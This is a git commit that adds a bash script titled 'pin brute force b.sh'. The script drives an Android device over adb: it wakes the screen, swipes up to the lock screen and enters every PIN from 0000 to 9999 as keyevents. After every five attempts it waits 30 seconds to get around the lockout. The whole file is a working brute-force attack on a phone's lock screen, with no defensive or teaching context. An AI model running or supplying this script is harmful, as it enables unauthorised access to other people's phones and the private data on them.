9a5d34bac627478d8fffa15a6a87b12684f29ef0
Prabin <76979813+prabin4456@users.noreply.github.com>
2021-09-03 17:12:10 +0545

    Add files via upload

---
+++ pin brute force b.sh
@@ -0,0 +1,32 @@
+#!/usr/bin/env bash
+echo ---------------
+echo PAYLOAD STARTED
+echo ---------------
+ 
+adb shell input keyevent 82
+adb shell input swipe 407 1211 378 85
+ 
+echo -------------
+echo BRUTE FORCING
+echo -------------
+ 
+for i in {0000..9999}; do
+ 
+    echo -----------
+    echo TRYING $i
+    echo -----------
+	
+    for (( j=0; j<${#i}; j++ )); do
+        adb shell input keyevent $((`echo ${i:$j:1}`+7))
+    done
+ 
+    adb shell input keyevent 66
+    
+    if ! (( `expr $i + 1` % 5 )); then
+        adb shell input keyevent 66
+        sleep 30
+        adb shell input keyevent 82
+        adb shell input swipe 407 1211 378 85
+    fi
+done
+ 
